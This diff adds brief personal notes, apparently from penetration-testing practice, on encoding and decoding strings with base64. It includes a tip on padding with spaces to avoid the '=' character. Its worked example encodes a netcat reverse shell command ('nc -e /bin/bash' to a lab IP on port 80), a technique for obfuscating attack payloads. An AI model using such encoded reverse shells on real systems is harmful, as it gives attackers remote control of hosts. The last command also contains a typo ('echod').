@@ -1,0 +1,15 @@
+#Encode
+    echo "anything" | base64        #This outputs YW55dGhpbmcK
+    echo -n "anything" | base64     #This outputs YW55dGhpbmc=
+    
+    
+    *add space to remove the equal sign = 
+    echo "nc -e /bin/bash 192.168.49.213 80" | base64 
+        This outputs    bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMjEzIDgwCg==
+   
+    echo " nc -e /bin/bash 192.168.49.213 80 " | base64        #notice the space at then begining and the end
+        This outputs    IG5jIC1lIC9iaW4vYmFzaCAxOTIuMTY4LjQ5LjIxMyA4MCAK
+
+
+#Decode
+    echod "YW55dGhpbmcK" | base64 -d
